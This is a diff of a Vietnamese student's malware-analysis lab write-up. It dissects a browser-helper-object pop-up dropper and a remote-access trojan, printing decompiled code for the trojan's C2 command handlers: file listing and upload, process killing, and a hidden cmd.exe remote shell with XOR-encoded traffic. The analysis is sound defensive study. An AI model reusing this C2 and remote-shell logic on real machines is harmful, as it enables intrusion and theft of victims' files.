@@ -1,13 +1,21 @@
 # **Lab_03-1.malware**
+
 1. 
+
 Dùng resourec hacker để xem resource của file, ta tìm được 1 resource khả nghi nằm trong `RC_DATA` (là section `.rsrc`).
+
 ![[Pasted image 20260921084455.png]]
+
 Ta có thể nhận diện ngay đây là dữ liệu của 1 file thực thi PE. Để extract nó, trong Resource hacker đã có sẵn chức năng extract rồi.
 
 2. 
+
 ![[Pasted image 20260921085139.png]]
+
 Trong số các DLL, chỉ có thằng `KERNEL32.DLL` là có thể có các API đặc trừng cho hành vi của malware, nên ta chỉ cần xét `KERNEL32.DLL`.
+
 ![[Pasted image 20260921085315.png]]
+
 Đầu tiên là cụm:
 ```
 GetModuleHandleW
@@ -27,6 +35,7 @@ WriteFile
 CloseHandle
 ```
 Tạo ra hành vi extract resource/dropper.
+
 - `GetModuleHandleW`: Lấy handle của 1 module hiện tại hoặc 1 dll đã được nạp, malware thường lấy handle của chính nó để truy cập vào resource của PE.
 - `FindSourceW`: Tìm 1 resource trong `.rsrc` của module.
 - `LoadResource`: Lấy handle của resource đó.
@@ -35,7 +44,9 @@ Tạo ra hành vi extract resource/dropper.
 - `CreateFileW`: Tạo hoặc mở file đích trên ổ đĩa.
 - `WriteFile`: Ghi dữ liệu vào file đích.
 - `CloseHanlde`: Đóng handle.
+
 Tiếp đến là API antidebug cơ bản: `IsDebuggerPresent`.
+
 Cụm xử lí exception:
 ```
 SetUnhandledExceptionFilter
@@ -52,21 +63,29 @@ TerminateProcess
 - `TerminateProcess`: Buộc kết thúc 1 tiến trình.
 
 3. 
+
 ![[Pasted image 20260921093455.png]]
+
 Đây là những chuỗi khả nghi trong chương trình. 
+
 - Đầu tiên là các URL lạ, phù hợp với trường hợp được ghi nhận trong đề: random popups.
 - Tiếp đến là `explorer.exe`, có nhiều hướng để khai thác từ chuỗi này.
 - `Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{3543619C-D563-43f7-95EA-4DA7E1CC396A}` chuỗi này dùng để khai báo 1 BHO (là 1 loại COM object), đóng vai trò như 1 plugin, gắn trực tiếp vào IE, hoặc đôi khi là gắn vào `explorer.exe`. Cơ chế nạp: Mỗi khi trình duyệt khởi chạy, nó sẽ tự động quét khóa Registry `Browser Helper Objects`. Nếu thấy bất kỳ khóa con nào chứa CLSID (như `{3543619C-D563-43f7-95EA-4DA7E1CC396A}`), hệ điều hành sẽ tìm file `.dll` tương ứng trong `HKCR\CLSID\{...}\InprocServer32` và nạp thẳng DLL đó vào bộ nhớ của tiến trình trình duyệt. Ngoài ra, tham số `NoExplorer` bên dưới có tác dụng cho BHO chỉ gắn vào IE, không gắn vào `explorer.exe`, tránh crash hoặc bị phát hiện.
 
 4. 
+
 Cơ chế persistence được sử dụng ở đây đó là tạo 1 BHO gắn vào IE (như đã nói ở bài 3), dấu hiệu đó là các strings cực kì khả nghi nằm trong file.
 
 **Từ phần này nên đọc lại [[COM]] và [[BHO]] để hiểu rõ trước.**
+
 5. 
+
 {3543619C-D563-43f7-95EA-4DA7E1CC396A}
 
 6. 
+
 Để biết được COM Interface, ta cần tìm IID của nó, từ đó có thể xác nhận được loại Interface sử dụng.
+
 Đầu tiên ta tìm được `DllGetClassObject`
 ```c
 HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
@@ -105,6 +124,7 @@ riid   = Windows muốn DLL trả về interface nào?
 ppv    = địa chỉ để DLL ghi interface pointer vào
 ```
 Hình dung Windows hỏi DLL:
+
 > “Trong DLL của mày có class mang CLSID này không? Nếu có, đưa tao interface mà tao yêu cầu.”
 
 Khối `if` đầu tiên:
@@ -128,6 +148,7 @@ Giá trị trả về:
 = CLASS_E_CLASSNOTAVAILABLE
 ```
 Nghĩa là:
+
 > Nếu CLSID Windows yêu cầu không khớp CLSID mà DLL hỗ trợ, DLL báo “class này không có”.
 
 Sau khi xác nhận đúng clsid, code chạy tiếp:
@@ -138,6 +159,7 @@ if (IsBadWritePtr(ppv, 4u))
 *ppv = nullptr;
 ```
 Đoạn này chỉ là để kiểm tra xem vùng nhớ có ghi được không.
+
 Tiếp theo:
 ```cpp
 v4 = operator new(0x10u);
@@ -190,6 +212,7 @@ sub_100011A0 → CreateInstance
 sub_100012A0 → LockServer
 ```
 Phần tử còn lại không cần thiết, bỏ qua:
+
 Vậy là đã xong bước 2 của sơ đồ:
 ```
 [iexplore.exe]
@@ -317,12 +340,14 @@ int __stdcall sub_100020B0(void *This, void *pUnkSite)
 }
 ```
 Giờ thì chuẩn rồi.
+
 Khối `if` đầu tiên:
 ```c
 if ( pUnkSite != nullptr )
     (*(void (__stdcall **)(void *))(*(_DWORD *)pUnkSite + 4))(a1: pUnkSite);
 ```
 Khối này để kiểm tra xem `pUnkSite` có được truyền vào không, nếu có thì dùng method `AddRef` (được định nghĩa sẵn cho 1 đối tượng Unknown Site, xem lại lí thuyết).
+
 Tiếp đến, nó thực hiện hàm `sub_10002220` với tham số truyền vào là còn trỏ `this`
 ```c
 int __stdcall sub_100020B0(void *This, void *pUnkSite)
@@ -343,6 +368,7 @@ int __stdcall sub_100020B0(void *This, void *pUnkSite)
 }
 ```
 Có một điều khá vô lí là ở con trỏ `this`, chỉ có duy nhất `vtable` là đã được khởi tạo, còn lại đều chưa, có thể là nó sẽ chạy trong 1 lần lặp nào đó, còn lần khởi tạo này thì chưa. Ta tạm thời bỏ qua hàm này.
+
 Tiếp đó là lệnh:
 ```c
 v3 = (**(int (__stdcall ***)(void *, const IID *, char *))pUnkSite)(a1: pUnkSite, a2: &riid, a3: (char *)This + 16);
@@ -351,15 +377,18 @@ Lệnh này thực hiện gọi đến hàm ở đầu của `vtable` của `pUn
 ```
 IID <0D30C1661h, 0CDAFh, 11D0h, <8Ah, 3Eh, 0, 0C0h, 4Fh, 0C9h, 0E2h, \
 ```
-Vậy, có nghĩa là BHO đang truy vấn xem `pUnkSite` (Object của IE, do IE truyền vào) xem có hỗ trợ Interface ==WebBrowser2==![[Pasted image 20260921233640.png]]
+Vậy, có nghĩa là BHO đang truy vấn xem `pUnkSite` (Object của IE, do IE truyền vào) xem có hỗ trợ Interface $\color{green}{\text{WebBrowser2}}$![[Pasted image 20260921233640.png]]
 
 7. 
+
 Ở câu trước, ta đã xác định malware lấy được con trỏ tới interface:
 ```cpp
 IWebBrowser2
 ```
 Để tìm những method mà malware gọi từ interface này, ta cần tìm các lời gọi gián tiếp thông qua vtable của `IWebBrowser2`.
+
 *Tìm hàm xử lý sự kiện của Internet Explorer*
+
 Trong hàm `sub_10002180`, malware gọi:
 ```cpp
 This->pConnectionPoint->Advise(
@@ -415,6 +444,7 @@ sub_10001800 → GetIDsOfNames
 sub_10001810 → Invoke
 ```
 Như vậy, `sub_10001810` chính là `IDispatch::Invoke`, được IE gọi khi một browser event xảy ra.
+
 Trong hàm này có đoạn:
 ```cpp
 if ( a2 == 250 )
@@ -445,6 +475,7 @@ Do đó, mỗi khi IE chuẩn bị điều hướng tới một URL, nó gọi `
 sub_10001AD0
 ```
 *Phân tích `sub_10001AD0`*
+
 Toàn bộ hàm:
 ```cpp
 char __stdcall sub_10001AD0(
@@ -540,7 +571,8 @@ char __stdcall sub_10001AD0(
   return 0;
 }
 ```
-==Khởi tạo danh sách URL==
+$\color{green}{\text{Khởi tạo danh sách URL}}$
+
 Đầu tiên, malware tạo một mảng chứa sáu URL:
 ```cpp
 lpMultiByteStr[0] = "http://rpis.ec/";
@@ -554,7 +586,9 @@ lpMultiByteStr[5] =
   "http://security.cs.rpi.edu/courses/binexp-spring2015/";
 ```
 Đây là sáu địa chỉ mà malware có thể mở trong cửa sổ Internet Explorer mới.
-==Tạo giá trị ngẫu nhiên==
+
+$\color{green}{\text{Tạo giá trị ngẫu nhiên}}$
+
 Tiếp theo:
 ```cpp
 v7 = sub_10001AB0(Time: nullptr);
@@ -564,6 +598,7 @@ if ( rand() % 3 != 0 )
     return a7;
 ```
 `sub_10001AB0` lấy giá trị thời gian, sau đó dùng nó làm seed cho `srand`.
+
 Điều kiện:
 ```cpp
 rand() % 3 != 0
@@ -577,14 +612,18 @@ Xác suất xảy ra trường hợp này là khoảng:
 1/3
 ```
 Vì vậy, malware không mở pop-up trong mọi lần điều hướng, mà chỉ mở ngẫu nhiên khoảng một phần ba số lần.
-==Khởi tạo COM==
+
+$\color{green}{\text{Khởi tạo COM}}$
+
 Tiếp theo:
 ```cpp
 if ( CoInitialize(pvReserved: nullptr) < 0 )
     return a7;
 ```
 `CoInitialize` khởi tạo COM library cho thread hiện tại. Nếu khởi tạo thất bại, hàm kết thúc và không tạo cửa sổ IE mới.
-==Tạo Internet Explorer COM object==
+
+$\color{green}{\text{Tạo Internet Explorer COM object}}$
+
 Sau khi COM được khởi tạo, malware gọi
 ```cpp
 v16 = CoCreateInstance(
@@ -615,7 +654,8 @@ sẽ chứa con trỏ tới interface:
 ```cpp
 IWebBrowser2 *ppv;
 ```
-==Chọn ngẫu nhiên một URL==
+$\color{green}{\text{Chọn ngẫu nhiên một URL}}$
+
 Code tiếp theo:
 ```cpp
 v9 = rand();
@@ -629,8 +669,11 @@ Phép:
 v9 % 6
 ```
 tạo ra giá trị từ `0` tới `5`, tương ứng với một trong sáu phần tử của mảng `lpMultiByteStr`.
+
 Như vậy, malware chọn ngẫu nhiên một URL trong danh sách rồi chuẩn bị URL đó để truyền cho COM method của `IWebBrowser2`.
-==COM function thứ nhất==
+
+$\color{green}{\text{COM function thứ nhất}}$
+
 Lời gọi đầu tiên thông qua vtable của `ppv`:
 ```cpp
 (*(void (__stdcall **)(LPVOID, int))
@@ -644,6 +687,7 @@ Ta phân tích như sau:
 *(_DWORD *)ppv
 ```
 lấy địa chỉ vtable của interface `IWebBrowser2`.
+
 Sau đó:
 ```cpp
 *(_DWORD *)ppv + 164
@@ -667,10 +711,13 @@ HRESULT IWebBrowser2::put_Visible(
 );
 ```
 Tham số được truyền vào là một giá trị khác `0`, nên cửa sổ Internet Explorer được đặt thành trạng thái hiển thị.
+
 Công dụng của method này là:
+
 > Hiển thị cửa sổ Internet Explorer mới mà malware vừa tạo bằng `CoCreateInstance`.
 
-==Chuẩn bị tham số URL==
+$\color{green}{\text{Chuẩn bị tham số URL}}$
+
 Tiếp theo:
 ```cpp
 v10 = sub_10001550(
@@ -682,7 +729,9 @@ v10 = sub_10001550(
       );
 ```
 Đoạn này chuẩn bị URL cùng các tham số rỗng cần thiết trước khi gọi method điều hướng của `IWebBrowser2`.
-==COM function thứ hai==
+
+$\color{green}{\text{COM function thứ hai}}$
+
 Lời gọi thứ hai thông qua vtable:
 ```cpp
 (*(void (__stdcall **)
@@ -701,6 +750,7 @@ Tương tự:
 *(_DWORD *)ppv
 ```
 lấy vtable của `IWebBrowser2`.
+
 Sau đó:
 ```cpp
 *(_DWORD *)ppv + 44
@@ -734,10 +784,13 @@ ppv->Navigate(
 );
 ```
 Trong đó `URL` là một trong sáu địa chỉ được malware chọn ngẫu nhiên.
+
 Công dụng của method này là:
+
 > Điều hướng cửa sổ Internet Explorer vừa được tạo tới URL mà malware lựa chọn.
 
-==Khôi phục pseudocode dễ đọc==
+$\color{green}{\text{Khôi phục pseudocode dễ đọc}}$
+
 Toàn bộ logic chính của hàm có thể viết lại như sau:
 ```cpp
 char HandleBeforeNavigate2(/* các tham số event */)
@@ -794,7 +847,8 @@ char HandleBeforeNavigate2(/* các tham số event */)
     return FALSE;
 }
 ```
-==Kết luận==
+$\color{green}{\text{Kết luận}}$
+
 Hai COM method mà malware gọi từ interface `IWebBrowser2` là:
 ```text
 IWebBrowser2::put_Visible
@@ -824,16 +878,23 @@ Navigate mở một URL ngẫu nhiên
 Do đó, hai method này được malware sử dụng để tạo ra các cửa sổ pop-up Internet Explorer xuất hiện ngẫu nhiên.
 
 # **Lab_03-2.malware**
+
 1.
+
 ![[Pasted image 20260922150148.png]]
+
 MD5: `bf4f5b4ff7ed9c7275496c07f9836028`
 
 ![[Pasted image 20260922150305.png]]
+
 58/70 phần mềm phân tích đánh dấu là độc hại.
+
 Nhãn phổ biến: `trojan.dqls/skeeyah`
+
 VT gán vào loại: Trojan, ransomeware
 
 2. 
+
 *KERNEL32.DLL*
 ```
 #	Thunk	Ordinal	Hint	Name
@@ -923,7 +984,9 @@ GetLogicalDrives
 - `CopyFileA`: Sao chép file nguồn sang file đích.
 - `GetSystemDirectoryA`: Lấy đường dẫn thư mục hệ thống.
 - `GetModuleFileNameA`: Lấy đường dẫn file thực thi của module hiện tại hoặc module được chỉ định.
+
 Cụm này có thể tạo ra hành vi: Dò ổ đĩa và phát tán các file độc hại.
+
 Cụm:
 ```
 CreatePipe
@@ -934,7 +997,9 @@ CreatePipe
 - `CreateProcessA`: Tạo 1 tiến trình mới.
 - `PeekNamePipe`: Kiểm tra xem pipe có dữ liệu không.
 - `Read/WriteFile`: Đọc ghi qua I/O.
+
 Cụm này tạo ra hành vi: tạo tiến trình ngầm và thực hiện giao tiếp với tiến trình qua I/O.
+
 *ADVAPI32.DLL*
 ```
 #	Thunk	Ordinal	Hint	Name
@@ -944,18 +1009,24 @@ Cụm này tạo ra hành vi: tạo tiến trình ngầm và thực hiện giao 
 3	00009a74		00d7	GetUserNameA
 ```
 Các API này tạo nên hành vi: mở, đọc, chỉnh sửa registry.
+
 *WS2_32.DLL*
+
 API này dùng để giao tiếp mạng, nên bản thân nó đã có thể tạo ra hành vi độc hại.
 
 3. 
+
 Đây là các chuỗi khả nghi trong file:
+
 ![[Pasted image 20260922155129.png]]
+
 - `sysinfo` thường gợi đến system information, nhưng vấn đề ở đây là không có lệnh, hay phần mềm chuẩn nào của Windows là `sysinfo`, có thể đây là 1 lệnh tùy chỉnh -> gợi ý về hành vi remote shell. Các từ khóa khác như `fxftest`, `configserver`, `DIR`, `upfileok`, `upfileer` cũng tương tự.
 - `cmd.exe`, `\java.exe` là 2 tên phần mềm.
 - `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` là đường dẫn registry, có dùng để tự động chạy chương trình khi người dùng đăng nhập.
 - Ngoài ra còn có địa chỉ localhost `127.0.0.1`.
 
 4. 
+
 Bằng phân tích tĩnh cơ bản, ta thấy được cơ chế persistent được sử dụng đó là sửa registry key để giúp malware tự động khởi chạy khi người dùng đăng nhập, có thể có cơ chế khác nhưng phải phần tích nâng cao mới biết được.
 
 5. 
@@ -1122,10 +1193,13 @@ LABEL_13:
 }
 ```
 Đọc hàm `main`, ta tìm thấy ngay 1 cấu trúc `switch-case`, mở thử các hàm thì ta thấy được các chuỗi khả nghi đã thấy ở bài trên nằm rải rác trong các hàm này, ngoài ra, trước cấu trúc `switch-case`, chương trình còn thực hiện kết nối đến 1 socket mạng, điều này càng khẳng định đây chính là cơ chế remote shell của malware, và đây chính là hàm xử lí các hành vi được liệt kê trong đề bài.
+
 (Các câu 5, 6, 7, 8 đều được làm chung cả).
 
 6. 
+
 Đầu tiên, đọc qua hàm `main`, ta thấy rằng, sau khi kết nối, malware sẽ gửi 1 chuỗi `fxftest` để báo hiệu. Sau đó, máy chủ c2 sẽ gửi lại chuỗi `fxftest` để báo hiệu kết nối thành công. Sau đó, malware lại thực hiện gửi tiếp 1 đoạn dữ liệu nữa, rồi sau đó lắng nghe socket, chờ C2 gửi lệnh. Lệnh ở đây là các số định danh (command ID), để biết mỗi lệnh làm gì, ta cần phải đọc code của từng hàm tương ứng với mỗi case.
+
 *Case 1*
 ```c
 int __cdecl sub_4018C0(SOCKET s)
@@ -1203,10 +1277,13 @@ int __cdecl sub_4018C0(SOCKET s)
 }
 ```
 Khác với dự đoán lúc đầu, các API `GetLogicalDrives`, `GetDriveTypeA` dùng để đọc thông tin về ổ đĩa của máy nạn nhân, và gửi về cho máy chủ C2. Cụ thể:
+
 - Đầu tiên, nó dùng API `GetLogicalDrives` để lấy dãy bit mask các ổ đĩa tồn tại, sau đó, nó thực hiện duyệt 1 toàn bộ dãy bit mask, với mỗi bit 1, nó lấy index, đem cộng với `65` là kí tự `A` để ra root của đường dẫn ổ đĩa.
 - Sau đó, nó dùng `GetDriveTypeA` để lấy thông tin về loại ổ, rồi thực hiện ghi theo format `root - type` vào buffer. 
 - Sau khi thực hiện duyệt xong các ổ, nó thêm vào kí tự `#` (`word_40A154`) để báo hiệu kết thúc, rồi đem mã hóa bằng phép xor với 0x55, rồi gửi về cho máy chủ C2.
+
 Vậy, `ID = 1` là lệnh lấy thông tin ổ đĩa.
+
 *Case 2*
 ```c
 int __cdecl sub_401A20(SOCKET s, LPCSTR lpFileName)
@@ -1351,25 +1428,34 @@ int __cdecl sub_401A20(SOCKET s, LPCSTR lpFileName)
 }
 ```
 Hàm này có nhiệm vụ lấy thông tin chi tiết về các file, folder để gửi về C2. Toàn bộ logic hàm vận hành tuần tự qua 4 giai đoạn cụ thể:
-==Giai đoạn 1: Giải mã đường dẫn và Khởi tạo tìm kiếm==
+
+$\color{green}{\text{Giai đoạn 1: Giải mã đường dẫn và Khởi tạo tìm kiếm}}$
+
 - Giải mã tham số đường dẫn (`lpFileName`): Vòng lặp `for ( i = 0; i < 256; ++i ) lpFileName[i] ^= 0x55u;` giải mã in-place chuỗi đường dẫn nhận từ C2 (ví dụ: `C:\*.*` đã bị mã hóa trước đó).
 - Khởi tạo tìm kiếm tệp đầu tiên:
     - Gọi `FindFirstFileA(lpFileName, &FindFileData)` để tìm đối tượng đầu tiên khớp với mẫu tìm kiếm.    
     - Nếu thất bại (`FirstFileA == (HANDLE)-1`): Gửi gói tin báo lỗi 2 bytes (`::buf`) về C2 và kết thúc hàm ngay lập tức.
     - Nếu thành công: Gửi gói tin 2 bytes `aO` (thường là mã phản hồi `"OK"`) về C2 để báo máy nạn nhân đã sẵn sàng truyền danh sách file.
-==Giai đoạn 2: Bóc tách thuộc tính và Đóng gói file đầu tiên==
+
+$\color{green}{\text{Giai đoạn 2: Bóc tách thuộc tính và Đóng gói file đầu tiên}}$
+
 Mỗi mục tệp/thư mục được đóng gói thành một struct cố định **516 bytes** trên mảng `pszPath`:
+
 - `pszPath[0..255]` (256 bytes): Tên file (`cFileName`).
 - `pszPath[256..319]` (64 bytes): Loại file. Gọi `SHGetFileInfoA` với cờ `0x510u` (`SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES`) để lấy tên định dạng (ví dụ: _"Text Document"_, _"Application"_). Nếu cờ thuộc tính chứa `0x10` (`FILE_ATTRIBUTE_DIRECTORY`), ghi đè chuỗi này thành `"DIR"`.
 - `pszPath[320..383]` (64 bytes): Dung lượng file. Lấy `nFileSizeLow` dịch phải 10 bit (`>> 10`, tức chia cho 1024) để đổi sang KB và format dạng `"%dK"`. Nếu là thư mục (`DIR`), để trống.
 - `pszPath[384..511]` (128 bytes): Thời gian sửa đổi lần cuối (`ftLastWriteTime`). Dùng `FileTimeToSystemTime` đổi sang giờ hệ thống và format thành chuỗi `"YYYY-MM-DD HH:MM:SS"`.
 - `pszPath[512..515]` (4 bytes - DWORD): Cờ trạng thái (Has More Files flag), gán bằng `1` (báo hiệu vẫn còn dữ liệu phía sau).
-==Quy trình gửi gói tin có xác nhận (ACK Handshake):==
+
+$\color{green}{\text{Quy trình gửi gói tin có xác nhận (ACK Handshake):}}$
+
 - Bỏ qua hai thư mục ảo `.` và `..` (`asc_40A184` và `asc_40A180`).
 - Mã hóa XOR `0x55` cho 256 bytes đầu của `pszPath` (chỉ mã hóa phần tên file).
 - Gửi toàn bộ gói `516 bytes` qua socket: `send(s, pszPath, 516, 0)`.
 - Chờ phản hồi từ C2 qua `recv(s, buf, 2, 0)`. Nếu `atoi(buf) != 0`, tiếp tục lặp lại quá trình gửi cho đến khi server trả về mã chấp nhận (bảo đảm server đã đọc xong, tránh nghẽn socket).
-==Giai đoạn 3: Vòng lặp duyệt toàn bộ tệp còn lại (`FindNextFileA`)==
+
+$\color{green}{\text{Giai đoạn 3: Vòng lặp duyệt toàn bộ tệp còn lại (`FindNextFileA`)}}$
+
 - Vòng lặp quét:
     - Gọi `FindNextFileA(hFindFile, &FindFileData)` liên tục trong vòng lặp `while(1)`.  
     - Đối với mỗi tệp/thư mục tìm thấy, mã độc lặp lại toàn bộ quy trình đóng gói 516 bytes (lấy tên, loại, dung lượng KB, ngày giờ, gán cờ `pszPath[512] = 1`, XOR 256 bytes đầu, gửi và chờ ACK từ C2) tương tự như ở Giai đoạn 2.
@@ -1379,14 +1465,18 @@ Mỗi mục tệp/thư mục được đóng gói thành một struct cố đị
 while ( GetLastError() != 18 ); // 18 = ERROR_NO_MORE_FILES
 ``` 
 	- Khi duyệt hết danh sách tệp trong thư mục, vòng lặp chính thức dừng lại.
-==Giai đoạn 4: Gửi gói tin kết thúc (EOF) và Dọn dẹp tài nguyên==
+
+$\color{green}{\text{Giai đoạn 4: Gửi gói tin kết thúc (EOF) và Dọn dẹp tài nguyên}}$
+
 - Tạo gói tin EOF (End of File):
     - Đặt cờ trạng thái `pszPath[512] = 0` (báo cho C2 biết đã hết tệp, dừng nhận).
     - Mã hóa XOR `0x55` cho 256 bytes đầu của `pszPath`.    
     - Gửi gói tin 516 bytes cuối cùng này về C2.
 - Đóng handle:
     - Gọi `FindClose(FirstFileA)` để giải phóng handle tìm kiếm file của hệ điều hành và trả về kết quả.
+
 Vậy, `ID = 2` là lệnh liệt kê chi tiết thông tin về file/folder.
+
 *Case 3*
 ```c
 int __cdecl sub_402050(SOCKET s, LPCSTR lpCmdLine)
@@ -1402,8 +1492,11 @@ int __cdecl sub_402050(SOCKET s, LPCSTR lpCmdLine)
 }
 ```
 Hàm này có nhiệm vụ mã hóa và thực thi ngầm 1 lệnh/tiến trình mà C2 yêu cầu.
+
 - API `WinExec(lpCmdLine, uCmdShow: 0)` sẽ gọi trực tiếp đến file thực thi nằm trong `lpCmdLine`, nên Hàm này thiên về việc chạy ngầm 1 tiến trình mà C2 yêu cầu hơn, trừ khi C2 yêu cầu dạng `./file.exe <command>` thì khi này mới có thể nó là thực thi lệnh mà C2 yêu cầu.
+
 Vậy, `ID = 3` giúp thực thi lệnh/tiến trình mà C2 yêu cầu.
+
 *Case 4*
 ```c
 int __cdecl sub_4020A0(SOCKET s, LPCSTR lpFileName)
@@ -1419,7 +1512,9 @@ int __cdecl sub_4020A0(SOCKET s, LPCSTR lpFileName)
 }
 ```
 Hàm này có nhiệm vụ xóa file theo tên hoặc đường dẫn tuyệt đối mà C2 cung cấp.
+
 Vậy, `ID = 4` là lệnh xóa file.
+
 *Case 5*
 ```c
 int __cdecl sub_4020F0(SOCKET s)
@@ -1478,7 +1573,9 @@ LABEL_9:
 }
 ```
 Hàm này có nhiệm vụ tạo 1 file mới/mở file đã có trên máy nạn nhân và ghi dữ liệu mà c2 gửi xuống vào đó.
+
 Vậy, `ID = 5` là ghi dữ liệu vào file.
+
 *Case 6*
 ```c
 HANDLE __cdecl sub_402210(SOCKET s, LPCSTR lpFileName)
@@ -1543,7 +1640,9 @@ HANDLE __cdecl sub_402210(SOCKET s, LPCSTR lpFileName)
 }
 ```
 Hàm này thực hiện các hành vi: Lấy handle của 1 file trên máy, ánh xạ nó lên RAM, và gửi file về cho C2 (upload).
+
 Vậy, `ID = 6` là lệnh upload file.
+
 *Case = 7*
 ```c
 int __cdecl sub_402310(SOCKET s)
@@ -1584,11 +1683,14 @@ int __cdecl sub_402310(SOCKET s)
 }
 ```
 Hàm này có nhiệm vụ liệt kê tiến trình trên máy.
+
 - `PROCESSENTRY32` là cấu trúc chứa thông tin của một tiến trình (PID, tên file `.exe`, tiến trình cha, số luồng...).
 - `CreateToolhelp32Snapshot`: Chụp lại toàn bộ trạng thái của hệ thống tại 1 thời điểm.
 - `Process32First`: Duyệt  và lấy thông tin về tiến trình đầu tiên trong snapshot.
 - `Process32Next`: Duyệt và lấy thông tin về các tiến trình kế tiếp.
+
 Vậy, `ID = 7` là lệnh duyệt và liệt kê các tiến trình trên máy.
+
 *Case 8*
 ```c
 int __cdecl sub_402440(SOCKET s, char *String)
@@ -1605,7 +1707,9 @@ int __cdecl sub_402440(SOCKET s, char *String)
 }
 ```
 Hàm này dùng để kill 1 process đang chạy.
+
 Vậy, `ID = 8` là lệnh kill process.
+
 *Case 9*
 ```c
 int __cdecl sub_402490(SOCKET s)
@@ -1677,7 +1781,9 @@ int __cdecl sub_402490(SOCKET s)
 }
 ```
 Đây là hàm thực hiện cơ chế remote shell, nó tạo 1 tiến trình ngầm `cmd.exe`, kết nối với C2 thông qua pipe I/O.
+
 Vậy, `ID = 9` là lệnh khởi tạo remote shell.
+
 *Case 10*
 ```c
 int __cdecl sub_402660(SOCKET s, const char *lpBuffer)
@@ -1778,7 +1884,9 @@ LABEL_15:
 }
 ```
 Hàm này thực hiện ghi dữ liệu vào 1 pipe I/O của remote shell
+
 Vậy, `ID = 1` là lệnh thao tác với remote shell.
+
 *Case 11*
 ```c
 int __cdecl _mtinitlocks(SOCKET s)
@@ -1791,7 +1899,9 @@ int __cdecl _mtinitlocks(SOCKET s)
 }
 ```
 Đây là hàm hủy remote shell.
+
 Vậy, `ID = 11` là lệnh hủy remote shell.
+
 *Case 12*
 ```c
 int __cdecl sub_402880(SOCKET s)
@@ -1810,10 +1920,13 @@ int __cdecl sub_402880(SOCKET s)
 }
 ```
 Đây là cơ chế echo của giao thức mạng do RATs sử dụng.Trong các phần mềm gián điệp, tính năng "gương phản chiếu" 7 bytes này thường phục vụ 3 mục đích:
+
 - **Keep-Alive (Chống rớt mạng / Bypass NAT Timeout):** Kết nối TCP nếu để im quá lâu không truyền dữ liệu sẽ bị tường lửa, Router hoặc bảng NAT ở giữa tự động ngắt (TCP Idle Timeout). Định kỳ C2 sẽ bắn một gói tin nhỏ 7 bytes để giữ kết nối luôn thông suốt.
 - **Heartbeat & Đo độ trễ (Ping / RTT Measurement):** C2 Server gửi một chuỗi 7 bytes (ví dụ: `"PING123"` hoặc timestamp rút gọn). Khi nhận lại đúng 7 bytes đó, C2 biết chắc chắn con bot vẫn còn sống (alive) và đo được độ trễ mạng (Ping) của máy nạn nhân.
 - **Handshake kiểm tra socket:** Trước khi C2 chuẩn bị chuyển sang một lệnh nặng (như truyền file lớn hoặc mở Shell), nó bắn 7 bytes để test xem socket có đang ở trạng thái sẵn sàng hay không.
+
 Vậy, `ID = 12` là lệnh echo.
+
 *Case 13*
 ```c
 void __cdecl sub_4028C0(int a1, char *a2)
@@ -1822,11 +1935,13 @@ void __cdecl sub_4028C0(int a1, char *a2)
 }
 ```
 Đây là lệnh ngủ.
+
 Vậy, `ID = 3` là lệnh ngủ.
 
 Vậy, các  ID thực hiện các hành vi mà đề bài chỉ ra đó là:
-- ==List processes:== `7`
-- ==interactive remote shell:== `9`, `10`, `11`
-- ==upload file:== '6'
+
+- $\color{green}{\text{List processes:}}$ `7`
+- $\color{green}{\text{interactive remote shell:}}$ `9`, `10`, `11`
+- $\color{green}{\text{upload file:}}$ '6'
 
 9. (Đã phân tích hết các hàm ở bên trên)
